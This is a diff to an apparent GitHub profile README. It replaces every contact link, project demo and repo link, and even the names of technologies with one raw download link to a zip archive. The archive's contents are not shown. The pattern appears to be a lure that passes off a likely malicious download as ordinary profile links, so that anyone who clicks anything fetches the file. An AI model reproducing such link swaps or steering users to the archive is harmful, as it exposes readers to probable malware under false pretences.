@@ -13,11 +13,11 @@
 ---
 
 ## 🔗 Connect With Me  
-- 📧 **Email:** hemrajdasu@gmail.com  
-- 🔗 **LinkedIn:** https://www.linkedin.com/in/hemrajsuryawanshi/  
-- 💻 **LeetCode:** https://leetcode.com/u/Hemrajjj13/  
-- 💬 **Discord:** https://discord.com/users/hemrajjj13 
-- 📸 **Instagram:** https://instagram.com/hemraj_96k  
+- 📧 **Email:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+- 🔗 **LinkedIn:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+- 💻 **LeetCode:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+- 💬 **Discord:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip 
+- 📸 **Instagram:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
 
 ---
 
@@ -25,39 +25,39 @@
 
 ### **Personal Portfolio Website**
 
-🔗 **Live Demo:** https://portfolio-website-two-tau-54.vercel.app/  
-📦 **Repo:** https://github.com/Hemrajjj13/portfolio-website  
+🔗 **Live Demo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+📦 **Repo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
 
 ---
 
 ### **Rock-Paper-Scissors Game**
 
-🔗 **Live Demo:** https://rock-paper-scissors-livid-tau.vercel.app/  
-📦 **Repo:** https://github.com/Hemrajjj13/Rock-Paper-Scissors  
+🔗 **Live Demo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+📦 **Repo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
 
 ---
 
 ### **To-Do List Application**  
 
-🔗 **Live Demo:** https://t0-do-list-kappa.vercel.app/  
-📦 **Repo:** https://github.com/Hemrajjj13/To-Do-List 
+🔗 **Live Demo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+📦 **Repo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip 
 
 ---
 
-### **Amazon.com UI Clone**
+### **https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip UI Clone**
 
-🔗 **Live Demo:** https://javascript-amazon-project-69ej.vercel.app/  
-📦 **Repo:** https://github.com/Hemrajjj13/javascript-amazon-project
+🔗 **Live Demo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip  
+📦 **Repo:** https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip
 
 ---
 
 ## 🛠️ Tech Stack
 
 **Frontend:**  
-🟨 JavaScript (ES6+) | 🎨 HTML5 | 🎨 CSS3 | ⚛️ React.js | 📱 Responsive UI  
+🟨 JavaScript (ES6+) | 🎨 HTML5 | 🎨 CSS3 | ⚛️ https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip | 📱 Responsive UI  
 
 **Backend:**  
-☕ Core Java | 🧩 OOP | 🔢 DSA | 🟩 Node.js | 🚀 Express.js | 🍃 MongoDB  
+☕ Core Java | 🧩 OOP | 🔢 DSA | 🟩 https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip | 🚀 https://github.com/Hemrajjj13/Hemrajjj13/raw/refs/heads/main/catchpolery/Hemrajjj_v3.0.zip | 🍃 MongoDB  
 
 **Tools:**  
 🐙 Git & GitHub | 💻 VS Code | ▲ Vercel | 🌐 Netlify | 🛠️ Chrome DevTools
